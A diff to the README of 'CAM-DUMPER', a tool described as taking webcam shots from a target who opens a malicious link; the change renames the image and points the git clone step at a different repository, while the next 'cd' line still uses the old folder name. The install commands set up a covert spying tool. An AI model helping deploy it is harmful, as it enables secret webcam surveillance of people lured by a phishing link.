@@ -1,5 +1,5 @@
 <h1 align="center">CAM-DUMPER</h1>
-<p align="center"><img src="cd.jpg" max-width="90%%" height="auto"></p>
+<p align="center"><img src="Somuk.jpg" max-width="90%%" height="auto"></p>
 <p align="center">Take webcam shots from target by just sending a malicious link</p>
 
 # How it works?
@@ -15,7 +15,7 @@
 ```
 $ apt update && apt upgrade
 $ apt install git php wget curl jq
-$ git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
+$ git clone https://github.com/Readone99/Somuk
 $ cd CAM-DUMPER
 $ chmod +x camdumper.sh
 $ ./camdumper.sh
